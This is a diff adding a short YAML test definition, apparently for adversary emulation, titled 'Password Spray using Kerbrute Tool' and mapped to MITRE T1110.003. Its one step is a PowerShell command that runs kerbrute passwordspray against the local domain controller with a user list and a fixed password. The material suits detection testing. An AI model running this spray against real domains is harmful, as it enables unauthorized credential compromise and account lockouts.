@@ -1,0 +1,29 @@
+api_version: "2.0"
+name: Password Spray using Kerbrute Tool
+description: |
+    Test a single password against a list of users
+args:
+    - name: domaincontroller
+      type: string
+      default: $ENV:userdnsdomain
+    - name: domain
+      type: string
+      default: $ENV:userdomain
+uuid: c6f25ec3-6475-47a9-b75d-09ac593c5ecb
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1110: Brute Force'
+    subtechniques:
+        - 'T1110.003: Password Spraying'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: password-spray-using-kerbrute-tool
+      inline: "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe passwordspray --dc {{.Args.domaincontroller}} -d {{.Args.domain}} \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\" password132 \n"
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
